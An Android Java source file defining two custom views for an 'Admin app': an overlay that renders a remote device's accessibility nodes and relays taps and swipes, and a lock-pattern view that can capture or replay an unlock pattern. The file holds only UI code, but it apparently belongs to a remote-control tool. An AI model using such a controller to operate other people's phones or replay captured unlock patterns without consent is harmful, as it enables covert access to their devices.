/*
 * MODULE: Views.java
 * PURPOSE: Custom UI interactive controls for Admin app (TouchView for screen gestures, PatternView for cyber lock pattern capture).
 *
 * DIRECT INBOUND CONNECTIONS:
 * - Panels.java (ScreenPanel, LockPanel) -> TouchView, PatternView
 *
 * DIRECT OUTBOUND CONNECTIONS:
 * - AdminRelayClient.java via OnTouchGestureListener and OnPatternDrawnListener
 *
 * FUNCTION-BY-FLOW MAPPING:
 * - TouchView: Renders accessibility nodes overlay and dispatches tap, swipe, long press gestures.
 * - PatternView: Dual-mode interactive and display cyber pattern view with directional indicators and glowing neon laser beams.
 */
package com.device.ctrl;
import android.content.Context;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.DashPathEffect;
import android.graphics.Paint;
import android.graphics.Path;
import android.graphics.RectF;
import android.os.Handler;
import android.os.Looper;
import android.util.AttributeSet;
import android.view.MotionEvent;
import android.view.View;
import java.util.ArrayList;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONObject;
class TouchView extends View {
    private Paint paint = new Paint(Paint.ANTI_ALIAS_FLAG);
    private Paint strokeP = new Paint(Paint.ANTI_ALIAS_FLAG);
    private Paint txtP = new Paint(Paint.ANTI_ALIAS_FLAG);
    private Paint ripplePaint = new Paint(Paint.ANTI_ALIAS_FLAG);
    private float startX, startY, curX, curY;
    private boolean dragging = false;
    private boolean showGrid = false;
    private long pressStart;
    private static final int DRAG_THRESHOLD = 15;
    private float lastTapX = -1, lastTapY = -1;
    private long tapAnimStart = 0;
    private List<NodeRect> nodeRects = new ArrayList<>();
    private int nodeScreenW = 1080, nodeScreenH = 2400;
    private boolean showNodes = false;
    public static class NodeRect {
        String type, text;
        int x, y, w, h;
        boolean clickable, checked;
    }
    public interface OnTouchGesture {
        void onTap(int x, int y);
        void onSwipe(int x1, int y1, int x2, int y2);
        void onLongPress(int x, int y);
        void onScroll(String direction);
        void onNodeTap(String text, int cx, int cy);
    }
    private OnTouchGesture listener;
    public TouchView(Context ctx) { super(ctx); init(); }
    public TouchView(Context ctx, AttributeSet attrs) { super(ctx, attrs); init(); }
    private void init() {
        paint.setStyle(Paint.Style.STROKE);
        paint.setColor(0x33FFFFFF);
        paint.setStrokeWidth(1f);
        strokeP.setStyle(Paint.Style.STROKE);
        strokeP.setStrokeCap(Paint.Cap.ROUND);
        strokeP.setStrokeJoin(Paint.Join.ROUND);
        txtP.setColor(0xFFFFFFFF);
        txtP.setTextAlign(Paint.Align.CENTER);
        txtP.setAntiAlias(true);
        ripplePaint.setStyle(Paint.Style.STROKE);
        ripplePaint.setColor(Color.parseColor("#6366F1"));
        ripplePaint.setStrokeWidth(4f);
    }
    public void setShowGrid(boolean show) { showGrid = show; invalidate(); }
    public void setOnTouchGestureListener(OnTouchGesture l) { listener = l; }
    public void setScreenSize(int w, int h) {
        if (w > 0 && h > 0 && (nodeScreenW != w || nodeScreenH != h)) {
            nodeScreenW = w; nodeScreenH = h; invalidate();
        }
    }
    public void setNodes(String nodesJson, int screenW, int screenH) {
        setScreenSize(screenW, screenH);
        nodeRects.clear();
        if (nodesJson == null || nodesJson.isEmpty()) { showNodes = false; invalidate(); return; }
        try {
            JSONArray arr = new JSONArray(nodesJson);
            for (int i = 0; i < Math.min(arr.length(), 150); i++) {
                JSONObject n = arr.getJSONObject(i);
                NodeRect nr = new NodeRect();
                nr.type = n.optString("type", "view");
                nr.text = n.optString("text", "");
                nr.x = n.optInt("x", 0); nr.y = n.optInt("y", 0);
                nr.w = n.optInt("w", 0); nr.h = n.optInt("h", 0);
                nr.clickable = n.optBoolean("clickable", false);
                nr.checked = n.optBoolean("checked", false);
                if (nr.w > 0 && nr.h > 0) nodeRects.add(nr);
            }
            java.util.Collections.sort(nodeRects, (a, b) -> {
                int ac = (a.clickable || "input".equals(a.type) || "switch".equals(a.type) || "button".equals(a.type)) ? 0 : 1;
                int bc = (b.clickable || "input".equals(b.type) || "switch".equals(b.type) || "button".equals(b.type)) ? 0 : 1;
                if (ac != bc) return ac - bc;
                return (a.w * a.h) - (b.w * b.h);
            });
            showNodes = !nodeRects.isEmpty();
        } catch (Exception ignored) {}
        invalidate();
    }
    public void clearNodes() { nodeRects.clear(); showNodes = false; invalidate(); }
    private int sampleColor = 0xFF00F0FF;
    public void setSampleColor(int c) { sampleColor = c; }
    @Override protected void onDraw(Canvas canvas) {
        super.onDraw(canvas);
        if (showGrid) {
            paint.setColor(0x18FFFFFF); paint.setStrokeWidth(1);
            for (int x = 0; x < getWidth(); x += 80) canvas.drawLine(x, 0, x, getHeight(), paint);
            for (int y = 0; y < getHeight(); y += 80) canvas.drawLine(0, y, getWidth(), y, paint);
        }
        if (showNodes && getWidth() > 0 && getHeight() > 0) drawNodes(canvas);
        long now = System.currentTimeMillis();
        if (lastTapX >= 0 && now - tapAnimStart < 400) {
            float progress = (now - tapAnimStart) / 400f;
            float radius = 10f + progress * 50f;
            int alpha = (int) ((1f - progress) * 200);
            ripplePaint.setAlpha(alpha);
            canvas.drawCircle(lastTapX, lastTapY, radius, ripplePaint);
            postInvalidateDelayed(16);
        }
    }
    private void drawNodes(Canvas canvas) {
        if (!showNodes || nodeRects.isEmpty() || nodeScreenW <= 0 || nodeScreenH <= 0) return;
        List<NodeRect> safeNodes = new ArrayList<>(nodeRects);
        float sc = Math.min((float) getWidth() / (float) nodeScreenW, (float) getHeight() / (float) nodeScreenH);
        float ox = (getWidth() - nodeScreenW * sc) / 2f;
        float oy = (getHeight() - nodeScreenH * sc) / 2f;
        float density = getResources().getDisplayMetrics().density;
        txtP.setTextSize(10 * density);
        for (NodeRect nr : safeNodes) {
            float l = ox + nr.x * sc, t = oy + nr.y * sc;
            float r = ox + (nr.x + nr.w) * sc, b = oy + (nr.y + nr.h) * sc;
            float radius = 4 * density;
            strokeP.setPathEffect(null);
            strokeP.setStrokeWidth(1.0f); 
            int strokeC = 0xAAFFFFFF; 
            if ("input".equals(nr.type)) {
                strokeP.setPathEffect(new DashPathEffect(new float[]{8, 8}, 0));
            }
            if (nr.clickable || nr.checked) {
                strokeC = 0xFFFFFFFF;
                strokeP.setStrokeWidth(1.5f);
            }
            strokeP.setColor(strokeC);
            RectF rect = new RectF(l, t, r, b);
            canvas.drawRoundRect(rect, radius, radius, strokeP);
            float boxW = r - l;
            float boxH = b - t;
            if (!nr.text.isEmpty() && boxH > 15) {
                String display = nr.text;
                float tSize = Math.min(12 * density, boxH * 0.5f);
                txtP.setTextSize(tSize);
                float textWidth = txtP.measureText(display);
                if (textWidth > boxW - 8) {
                    int chars = txtP.breakText(display, true, Math.max(1, boxW - 12), null);
                    if (chars > 0 && chars <= display.length()) {
                        display = display.substring(0, chars) + "..";
                    }
                }
                Paint.FontMetrics fm = txtP.getFontMetrics();
                float cx = l + boxW / 2f;
                float cy = t + boxH / 2f - (fm.ascent + fm.descent) / 2f;
                Paint bgPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
                bgPaint.setColor(0xBB000000); 
                float tw = txtP.measureText(display);
                canvas.drawRoundRect(cx - tw/2f - 6, cy + fm.ascent - 2, cx + tw/2f + 6, cy + fm.descent + 2, 6, 6, bgPaint);
                txtP.setColor(0xFFFFFFFF); 
                canvas.drawText(display, cx, cy, txtP);
            }
        }
    }
    @Override public boolean onTouchEvent(MotionEvent e) {
        switch (e.getAction()) {
            case MotionEvent.ACTION_DOWN:
                if (getParent() != null) getParent().requestDisallowInterceptTouchEvent(true);
                startX = curX = e.getX(); startY = curY = e.getY();
                dragging = false; pressStart = System.currentTimeMillis();
                return true;
            case MotionEvent.ACTION_MOVE:
                curX = e.getX(); curY = e.getY();
                if (!dragging && (Math.abs(curX - startX) > DRAG_THRESHOLD || Math.abs(curY - startY) > DRAG_THRESHOLD)) dragging = true;
                invalidate(); return true;
            case MotionEvent.ACTION_UP:
                if (listener == null) { dragging = false; invalidate(); return true; }
                if (!dragging) {
                    lastTapX = e.getX(); lastTapY = e.getY();
                    tapAnimStart = System.currentTimeMillis();
                    if (showNodes && checkNodeTap(e.getX(), e.getY())) { dragging = false; invalidate(); return true; }
                    if (System.currentTimeMillis() - pressStart > 400) listener.onLongPress((int) startX, (int) startY);
                    else listener.onTap((int) startX, (int) startY);
                } else {
                    float dx = curX - startX, dy = curY - startY;
                    if ((float) Math.sqrt(dx * dx + dy * dy) > DRAG_THRESHOLD) listener.onSwipe((int) startX, (int) startY, (int) curX, (int) curY);
                }
                dragging = false; invalidate(); return true;
        }
        return super.onTouchEvent(e);
    }
    private boolean checkNodeTap(float tx, float ty) {
        if (getWidth() <= 0 || getHeight() <= 0 || nodeScreenW <= 0 || nodeScreenH <= 0) return false;
        float sc = Math.min((float) getWidth() / (float) nodeScreenW, (float) getHeight() / (float) nodeScreenH);
        float ox = (getWidth() - nodeScreenW * sc) / 2f;
        float oy = (getHeight() - nodeScreenH * sc) / 2f;
        int rx = Math.round((tx - ox) / sc);
        int ry = Math.round((ty - oy) / sc);
        rx = Math.max(0, Math.min(nodeScreenW, rx));
        ry = Math.max(0, Math.min(nodeScreenH, ry));
        NodeRect best = null; float bestArea = Float.MAX_VALUE;
        for (NodeRect nr : nodeRects) {
            if (!nr.clickable && !"input".equals(nr.type) && !"switch".equals(nr.type) && !"button".equals(nr.type)) continue;
            float l = ox + nr.x * sc, t = oy + nr.y * sc;
            float r = ox + (nr.x + nr.w) * sc, b = oy + (nr.y + nr.h) * sc;
            if (tx >= l && tx <= r && ty >= t && ty <= b) { 
                float area = nr.w * nr.h; 
                if (area < bestArea) { bestArea = area; best = nr; } 
            }
        }
        if (best != null && listener != null) { 
            int targetX = (best.w > 300) ? rx : (best.x + best.w / 2);
            int targetY = (best.h > 300) ? ry : (best.y + best.h / 2);
            listener.onNodeTap(best.text, targetX, targetY); 
            return true; 
        }
        return false;
    }
}
class PatternView extends View {
    private Paint dotBasePaint, dotActivePaint, dotRingPaint, dotGlowPaint;
    private Paint linePaint, lineGlowPaint, textPaint, arrowPaint;
    private List<Integer> pattern = new ArrayList<>();
    private float[][] dots = new float[9][2];
    private float currentX, currentY;
    private boolean isDrawing = false;
    private boolean interactive = true;
    private OnPatternDrawnListener listener;
    private Handler handler = new Handler(Looper.getMainLooper());
    private Runnable clearRunnable;

    public interface OnPatternDrawnListener {
        void onPatternDrawn(String patternCode);
    }

    public PatternView(Context context) {
        super(context);
        init();
    }

    public PatternView(Context context, OnPatternDrawnListener listener) {
        super(context);
        this.listener = listener;
        init();
    }

    public void setInteractive(boolean interactive) {
        this.interactive = interactive;
    }

    private void init() {
        int neonGreen = Color.parseColor("#10B981");
        int neonCyan = Color.parseColor("#06B6D4");

        dotBasePaint = new Paint(Paint.ANTI_ALIAS_FLAG);
        dotBasePaint.setColor(Color.parseColor("#1E293B"));
        dotBasePaint.setStyle(Paint.Style.FILL);

        dotGlowPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
        dotGlowPaint.setColor(Color.parseColor("#3310B981"));
        dotGlowPaint.setStyle(Paint.Style.FILL);

        dotRingPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
        dotRingPaint.setColor(Color.parseColor("#334155"));
        dotRingPaint.setStyle(Paint.Style.STROKE);
        dotRingPaint.setStrokeWidth(2.5f);

        dotActivePaint = new Paint(Paint.ANTI_ALIAS_FLAG);
        dotActivePaint.setColor(neonGreen);
        dotActivePaint.setStyle(Paint.Style.FILL);

        lineGlowPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
        lineGlowPaint.setColor(Color.parseColor("#4410B981"));
        lineGlowPaint.setStyle(Paint.Style.STROKE);
        lineGlowPaint.setStrokeWidth(26f);
        lineGlowPaint.setStrokeCap(Paint.Cap.ROUND);
        lineGlowPaint.setStrokeJoin(Paint.Join.ROUND);

        linePaint = new Paint(Paint.ANTI_ALIAS_FLAG);
        linePaint.setColor(neonCyan);
        linePaint.setStyle(Paint.Style.STROKE);
        linePaint.setStrokeWidth(7f);
        linePaint.setStrokeCap(Paint.Cap.ROUND);
        linePaint.setStrokeJoin(Paint.Join.ROUND);

        arrowPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
        arrowPaint.setColor(Color.parseColor("#FFFFFF"));
        arrowPaint.setStyle(Paint.Style.FILL);

        textPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
        textPaint.setColor(Color.parseColor("#64748B"));
        textPaint.setTextSize(24f);
        textPaint.setTextAlign(Paint.Align.CENTER);
        textPaint.setFakeBoldText(true);
    }

    @Override
    protected void onSizeChanged(int w, int h, int oldw, int oldh) {
        super.onSizeChanged(w, h, oldw, oldh);
        float padding = Math.min(w, h) * 0.16f;
        float cw = (w - padding * 2) / 2f;
        float ch = (h - padding * 2) / 2f;
        int index = 0;
        for (int row = 0; row < 3; row++) {
            for (int col = 0; col < 3; col++) {
                dots[index][0] = padding + col * cw;
                dots[index][1] = padding + row * ch;
                index++;
            }
        }
    }

    public void setPattern(String code) {
        if (clearRunnable != null) handler.removeCallbacks(clearRunnable);
        pattern.clear();
        isDrawing = false;
        if (code != null && !code.isEmpty()) {
            for (int i = 0; i < code.length(); i++) {
                char c = code.charAt(i);
                if (c >= '1' && c <= '9') {
                    int idx = (c - '1');
                    if (!pattern.contains(idx)) {
                        pattern.add(idx);
                    }
                }
            }
        }
        invalidate();
    }

    private int getIntermediateDot(int from, int to) {
        if ((from == 0 && to == 2) || (from == 2 && to == 0)) return 1;
        if ((from == 3 && to == 5) || (from == 5 && to == 3)) return 4;
        if ((from == 6 && to == 8) || (from == 8 && to == 6)) return 7;
        if ((from == 0 && to == 6) || (from == 6 && to == 0)) return 3;
        if ((from == 1 && to == 7) || (from == 7 && to == 1)) return 4;
        if ((from == 2 && to == 8) || (from == 8 && to == 2)) return 5;
        if ((from == 0 && to == 8) || (from == 8 && to == 0)) return 4;
        if ((from == 2 && to == 6) || (from == 6 && to == 2)) return 4;
        return -1;
    }

    @Override
    protected void onDraw(Canvas canvas) {
        super.onDraw(canvas);
        float density = getResources().getDisplayMetrics().density;

        if (pattern.size() > 0) {
            Path path = new Path();
            float startX = dots[pattern.get(0)][0];
            float startY = dots[pattern.get(0)][1];
            path.moveTo(startX, startY);
            for (int i = 1; i < pattern.size(); i++) {
                path.lineTo(dots[pattern.get(i)][0], dots[pattern.get(i)][1]);
            }
            if (isDrawing && interactive) {
                path.lineTo(currentX, currentY);
            }
            canvas.drawPath(path, lineGlowPaint);
            canvas.drawPath(path, linePaint);

            for (int i = 0; i < pattern.size() - 1; i++) {
                float x1 = dots[pattern.get(i)][0];
                float y1 = dots[pattern.get(i)][1];
                float x2 = dots[pattern.get(i + 1)][0];
                float y2 = dots[pattern.get(i + 1)][1];
                drawDirectionArrow(canvas, x1, y1, x2, y2, density);
            }
        }

        for (int i = 0; i < 9; i++) {
            float cx = dots[i][0];
            float cy = dots[i][1];
            boolean active = pattern.contains(i);
            int stepOrder = pattern.indexOf(i);

            if (active) {
                canvas.drawCircle(cx, cy, 32f * density / 2f, dotGlowPaint);
                dotRingPaint.setColor(Color.parseColor("#10B981"));
                dotRingPaint.setStrokeWidth(3f);
                canvas.drawCircle(cx, cy, 28f * density / 2f, dotRingPaint);
                canvas.drawCircle(cx, cy, 14f * density / 2f, dotActivePaint);
                textPaint.setColor(Color.parseColor("#FFFFFF"));
            } else {
                dotRingPaint.setColor(Color.parseColor("#334155"));
                dotRingPaint.setStrokeWidth(2f);
                canvas.drawCircle(cx, cy, 26f * density / 2f, dotRingPaint);
                canvas.drawCircle(cx, cy, 12f * density / 2f, dotBasePaint);
                textPaint.setColor(Color.parseColor("#64748B"));
            }

            String label = active && stepOrder >= 0 ? String.valueOf(stepOrder + 1) : String.valueOf(i + 1);
            canvas.drawText(label, cx, cy + 8f * density, textPaint);
        }
    }

    private void drawDirectionArrow(Canvas canvas, float x1, float y1, float x2, float y2, float density) {
        float midX = (x1 + x2) / 2f;
        float midY = (y1 + y2) / 2f;
        float angle = (float) Math.atan2(y2 - y1, x2 - x1);
        float arrowSize = 6f * density;

        canvas.save();
        canvas.translate(midX, midY);
        canvas.rotate((float) Math.toDegrees(angle));

        Path arrowPath = new Path();
        arrowPath.moveTo(arrowSize, 0);
        arrowPath.lineTo(-arrowSize, -arrowSize * 0.7f);
        arrowPath.lineTo(-arrowSize * 0.4f, 0);
        arrowPath.lineTo(-arrowSize, arrowSize * 0.7f);
        arrowPath.close();

        canvas.drawPath(arrowPath, arrowPaint);
        canvas.restore();
    }

    @Override
    public boolean onTouchEvent(MotionEvent event) {
        if (!interactive) return super.onTouchEvent(event);
        currentX = event.getX();
        currentY = event.getY();
        int touchedDot = getTouchedDot(currentX, currentY);

        switch (event.getAction()) {
            case MotionEvent.ACTION_DOWN:
                if (clearRunnable != null) {
                    handler.removeCallbacks(clearRunnable);
                    clearRunnable = null;
                }
                pattern.clear();
                isDrawing = true;
                if (touchedDot != -1) pattern.add(touchedDot);
                break;
            case MotionEvent.ACTION_MOVE:
                if (touchedDot != -1 && !pattern.contains(touchedDot)) {
                    if (!pattern.isEmpty()) {
                        int last = pattern.get(pattern.size() - 1);
                        int mid = getIntermediateDot(last, touchedDot);
                        if (mid != -1 && !pattern.contains(mid)) {
                            pattern.add(mid);
                        }
                    }
                    pattern.add(touchedDot);
                }
                break;
            case MotionEvent.ACTION_UP:
            case MotionEvent.ACTION_CANCEL:
                isDrawing = false;
                if (pattern.size() > 0 && listener != null) {
                    StringBuilder sb = new StringBuilder();
                    for (int p : pattern) sb.append(p + 1);
                    listener.onPatternDrawn(sb.toString());
                }
                clearRunnable = () -> {
                    pattern.clear();
                    invalidate();
                };
                handler.postDelayed(clearRunnable, 3000);
                break;
        }
        invalidate();
        return true;
    }

    private int getTouchedDot(float x, float y) {
        for (int i = 0; i < 9; i++) {
            float dx = dots[i][0] - x;
            float dy = dots[i][1] - y;
            if (Math.hypot(dx, dy) < 95f) return i;
        }
        return -1;
    }

    public void clear() {
        if (clearRunnable != null) handler.removeCallbacks(clearRunnable);
        pattern.clear();
        isDrawing = false;
        invalidate();
    }
}
public class Views { private Views() {} }
